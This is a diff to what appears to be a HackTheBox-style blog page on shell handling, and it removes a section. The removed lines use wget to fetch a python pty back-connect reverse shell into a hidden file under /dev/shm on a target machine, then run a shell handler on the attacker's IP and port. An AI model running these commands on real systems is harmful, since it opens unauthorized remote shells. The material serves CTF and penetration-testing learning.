@@ -65,17 +65,6 @@ export TERM=xterm256-color
 stty rows number_of_row columns number_of_columns
 {% endhighlight %}
 
-Another option is to directly push a python pty shell to the targeted box:
-{% highlight bash%}
-wget https://raw.githubusercontent.com/Mushi-mushi/python-pty-shells/master/sctp_pty_backconnect.py -o /dev/shm/.shell.py
-{% endhighlight %}
-configure the shell with the correct IP and port then get the shell handler
-{% highlight bash%}
-wget https://raw.githubusercontent.com/Mushi-mushi/python-pty-shells/master/sctp_pty_shell_handler.py -o /root/HTB/handler.py
-python handler.py -b YourIP:Youropenedport
-{% endhighlight %}
-<sup>Shell scripts from [infodox][link11]</sup>
-
 Enjoy!
 
 [Back to the top](#header)
